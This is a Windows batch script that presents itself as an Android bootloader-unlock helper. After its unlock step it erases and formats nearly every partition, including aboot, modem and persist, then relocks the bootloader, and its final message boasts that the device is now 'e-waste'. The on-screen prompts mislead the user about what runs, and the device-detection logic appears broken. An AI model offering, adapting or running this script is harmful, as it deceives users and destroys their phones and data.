@echo off

echo ---------------------------------------------------------
echo WARNING: This script is designed for devices with an unlocked bootloader.
echo Attempting to run this script on devices with a locked bootloader does not have any effect.
echo Proceed with caution and make sure your device's bootloader is unlocked.
echo ---------------------------------------------------------
echo.

set /p "platform_tools=Enter the platform tools directory path: "

if not exist "%platform_tools%\adb.exe" (
    echo ADB executable not found in the specified directory.
    pause
    exit /b 1
)

if not exist "%platform_tools%\fastboot.exe" (
    echo Fastboot executable not found in the specified directory.
    pause
    exit /b 1
)

echo Platform tools directory: %platform_tools%
echo.

cd /d "%platform_tools%"

echo.

echo Checking connected devices...
adb devices

echo.

set "device_detected=false"
set "device_in_bootloader=false"

for /f "skip=1" %%d in ('adb devices') do (
    set "device_line=%%d"
    if "!device_line:~0,5!"=="device" (
        set "device_detected=true"
    )
    if "!device_line:~0,9!"=="fastboot" (
        set "device_in_bootloader=true"
    )
)

if "%device_detected%"=="true" (
    echo Device detected! Skipping USB debugging instructions.
    echo.
) else if "%device_in_bootloader%"=="true" (
    echo Device is in bootloader mode! Skipping USB debugging instructions.
    echo.
) else (
    echo If your device is not listed, make sure:
    echo 1. USB Debugging is enabled on your phone.
    echo 2. Your phone is connected to the computer via USB cable.
    echo.
    echo If USB Debugging is disabled, follow these steps:
    echo 1. Go to Settings > About phone > Tap "Build number" 7 times to enable Developer options.
    echo 2. Go to Settings > Developer options > Enable USB Debugging.
    echo 3. Reconnect your phone and run the script again.
    echo.
    echo If your phone is connected and USB Debugging is enabled, please check your USB cable and drivers.
    echo.
    pause
    exit /b 1
)

echo Rebooting to bootloader...
adb reboot bootloader

echo.

echo Waiting for device to enter bootloader...
timeout /t 10 /nobreak

:waitForUSBDebugging
echo.
echo Waiting for USB Debugging to be enabled...
timeout /t 5 /nobreak
echo.

adb devices | findstr /r /c:"device$"
if not "%errorlevel%"=="0" goto :waitForUSBDebugging

echo.
echo USB Debugging is enabled. You can now proceed with the bootloader unlock process.

pause

echo.
echo Unlocking bootloader...
fastboot flashing unlock

echo Waiting for device to restart...
timeout /t 10 /nobreak

echo.
echo Erasing and formatting partitions...
timeout /t 5 /nobreak

fastboot erase boot
fastboot format boot
fastboot erase system
fastboot format system
fastboot erase vendor
fastboot format vendor
fastboot erase cache
fastboot format cache
fastboot erase userdata
fastboot format userdata
fastboot erase metadata
fastboot format metadata
fastboot erase recovery
fastboot format recovery
fastboot erase persist
fastboot format persist
fastboot erase splash
fastboot format splash
fastboot erase dtbo
fastboot format dtbo
fastboot erase aboot
fastboot format aboot
fastboot erase abootbak
fastboot format abootbak
fastboot erase modem
fastboot format modem
fastboot oem lock

echo If your bootloader was unlocked, congratulations! You now have e-waste! (i tested this and it works)
echo If your device didn't work with this, maybe you got the wrong version
